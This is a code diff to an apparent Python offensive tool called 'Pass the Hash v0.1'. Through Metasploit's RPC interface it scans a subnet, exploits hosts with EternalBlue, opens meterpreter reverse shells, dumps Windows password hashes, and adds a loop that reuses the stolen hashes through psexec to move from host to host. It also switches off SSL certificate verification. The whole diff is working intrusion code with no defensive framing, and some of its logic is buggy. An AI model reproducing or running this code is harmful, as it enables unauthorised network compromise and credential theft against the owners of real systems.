@@ -25,6 +25,12 @@ def header():
           Pass the Hash v0.1   
     """)
 
+def mergeList(list1, list2):
+    """
+    MODIFIES LIST1 !!!
+    """
+    list1.extend(x for x in list2 if x not in list1)
+
 def convertIpToRange(ip):
 	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
 	return rgx.match(ip).group() + '0-255'
@@ -38,6 +44,23 @@ def gatherHashes(blob):
     for r in rgx.finditer(blob):
         dataGroups.append(r.groups())
     return dataGroups
+
+def setupRPC():
+    # Setup SSL fix
+    try:
+        _create_unverified_https_context = ssl._create_unverified_context
+    except AttributeError:
+        pass
+    else:
+        ssl._create_default_https_context = _create_unverified_https_context
+    # Create the connection to the RPC client
+    client = None
+    try:
+        client = MsfRpcClient('password')
+        return client
+    except:
+        print('please run msfrpc!')
+        return None
 
 def nmScan(ip):
     """
@@ -67,46 +90,64 @@ def nmScan(ip):
                 targets.append(host_obj)
     return targets
 
+def passTheHash(ip, localip, hashlist):
+    client = setupRPC()
+    print('Attempting to access ' + str(ip) + ' with hash list...')
+    exploit = client.modules.use('exploit', 'windows/smb/psexec')
+    exploit['RHOST'] = ip
+    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+    payload['LHOST'] = localip
+    # try each of the hashes until one works
+    for data in hashlist:
+        exploit['SMBUser'] = data[0]
+        exploit['SMBPass'] = data[2]
+        print('Trying ' + data[0] + " on " + ip + '...')
+        hashes = runExploit(client, exploit, payload)
+        if hashes != None:
+            print('Successfully accessed ' + ip)
+            return hashes
+    return None
+    
+
 def eternalBlue(ip, localip):
     print('Attempting to exploit ' + str(ip) + ' to gain access to the network...')
-    # Setup SSL fix
-    try:
-        _create_unverified_https_context = ssl._create_unverified_context
-    except AttributeError:
-        pass
-    else:
-        ssl._create_default_https_context = _create_unverified_https_context
-    # Create the connection to the RPC client
-    client = MsfRpcClient('password')
+    client = setupRPC()
     # Load eternal blue exploit
     exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
     exploit['RHOST'] = ip
     # Load the reverse_tcp shell payload
     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
     payload['LHOST'] = localip
+    hashes = runExploit(client, exploit, payload)
+    print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
+    return hashes
+
+def runExploit(client, exploit, payload):
     # Exploit the host
     proc = exploit.execute(payload=payload)
     jobId = proc.get('job_id') + 1 # add 1 because pymetasploit is horribly written
     timeout = 100
     count = 0
+    print('waiting for session')
     while(jobId not in client.sessions.list.keys() and count < timeout):
         time.sleep(3)
         count += 1
     if count >= timeout:
         return None
+    print('Got session')
     # Get the shell and run the hashdump
     shell = client.sessions.session(jobId)
     if shell == None:
         return None
     shell.runsingle('run post/windows/gather/hashdump')
-    
+    print('running hashdump')
     while(True):
         output = shell.read()
         if(':::' in output):
             hashes = gatherHashes(output)
-            print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
             shell.kill()
             return hashes
+    return None
 
 def getArgs(argv):
     if len(argv) < 4:
@@ -127,25 +168,29 @@ def getArgs(argv):
         
 def main():
     header()
-    # print('Starting msfrpc server...')
-    # call(["msfrpcd", "-P", "password", "-n", "-f", "-a", "127.0.0.1", "&"])
     args = getArgs(sys.argv)
     if args == None:
         return
     targets = nmScan(args['targetIp'])
     print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
     # Try to break into machines with eternal blue
-    initHashData = []
+    hashes = []
     for i in range(len(targets)):
         hashData = eternalBlue(targets[i].get('ip'), args['localIp'])
         if hashData != None:
             targets.pop(i)
-            initHashData = hashData
+            hashes = hashData
             break
-    if len(initHashData) > 0:
+    if len(hashes) > 0:
         # Found access to network start spidering
         print('Starting hash passing...')
-        pass
+        for i in range(len(targets)):
+            newHashes = passTheHash(args['targetIp'], args['localIp'], hashes)
+            if newHashes != None:
+                print('Adding ' + str(len(newHashes)) + ' to the hash list')
+                print(newHashes)
+                mergeList(hashes, newHashes)
+                targets.pop(i)
     else:
         print('Could not gain access to network... bye!')
 
